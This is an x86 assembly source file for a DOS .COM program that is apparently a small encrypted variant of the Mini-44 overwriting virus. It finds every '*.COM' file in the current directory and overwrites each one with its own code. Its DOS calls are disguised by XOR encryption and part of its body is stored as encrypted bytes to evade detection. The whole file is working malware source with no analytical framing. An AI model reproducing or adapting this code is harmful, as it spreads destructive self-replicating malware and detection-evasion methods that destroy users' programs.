.model small
.code
FNAME   EQU 9Eh 	;offset nume fisier .com gasit
ORG 100h		;specific .COM

;;Written by Stefan Pasat

NMINI:
        DUMMY1 DB 9Ch ;pushf
        DUMMY2 DB 60h ;pusha
        DUMMY3 DW 02B4h
        DUMMY4 DB 61h ;popa
        DUMMY5 DB 9Dh ;popf
        call ENC_DEC
        jmp MINI44

WRITE:
        xchg AX,BX		;put file handle for writing
        ;mov AH,40h              ;WRITE
        mov AH,47h
        call ENC_DEC2
        mov CL,127
        nop
        mov DX,100h
        call ENC_DEC
        int 21h
        call ENC_DEC
        ret

ENC_DEC:
push AX
push BX
push DX
push CX
mov CX, 21
mov DI, 013Ah ;locatia de la care incepe enc/dec
mov BX, offset ENC_KEY
mov DL, [BX]
repeat:
xor [DI], DL
inc DI
loop repeat
pop CX
pop DX
pop BX
pop AX
ret

MINI44:
        ;mov BL, 4Eh ;//2
        ;xchg DI, AX ;//1
        ;out DX, AX ;1
        ;sub AX, [BX] ;2
        ;mov BP, 067Eh ;3
        ;retf 7526h ;3
        ;daa ;1
        
        ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;; 13
        ;mov AH,4Eh		; SEARCH FIRST
        ;mov AH,49h
        ;nop
        ;call ENC_DEC2
        ;mov DX, offset COMP_FILE
        ;int 21h


        LINE1 db 0B3H
        LINE2 db 04EH
        LINE3 db 097H
        LINE4 db 0EFH
        LINE5 db 02BH
        LINE6 db 007H
        LINE7 db 0BDH
        LINE8 db 07EH
        LINE9 db 006H
        LINE10 db 0CAH
        LINE11 db 026H
SEARCH_LP:
        LINE12 db 075H ;;JUMP
        LINE13 db 027H ;;END JUMP
        LINE14 db 0BFH
        LINE15 db 006H
        LINE16 db 03DH
        LINE17 db 0EFH
        LINE18 db 018H
        LINE19 db 007H
        LINE20 db 0BDH
        LINE21 db 099H
        LINE22 db 000H
        ;mov DI, 3D06h
        ;out DX, AX
        ;sbb [BX], AL
        ;mov BP, 0099h
        ;jc DONE
        ;mov AX,3D01h		;OPEN
        ;mov AX,3A01h
        ;call ENC_DEC2
        ;mov DX, FNAME
        ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
        int 21h
        call WRITE
        ;mov AH,3Eh		;CLOSE
        mov AH,39h
        call ENC_DEC2
        int 21h
        nop
        ;mov AH,4Fh		;SEARCH NEXT
        mov AH,48h
        nop
        call ENC_DEC2
        int 21h

        jmp SEARCH_LP
        
DONE:
        call ENC_DEC
        nop
        ret

ENC_DEC2:
push BX
push DX
mov BX, offset ENC_KEY
mov DL, [BX]
xor AH, DL
pop DX
pop BX
ret

ENC_KEY DB 07h ;;04
COMP_FILE       DB      '*.COM',0

FINISH:
       END NMINI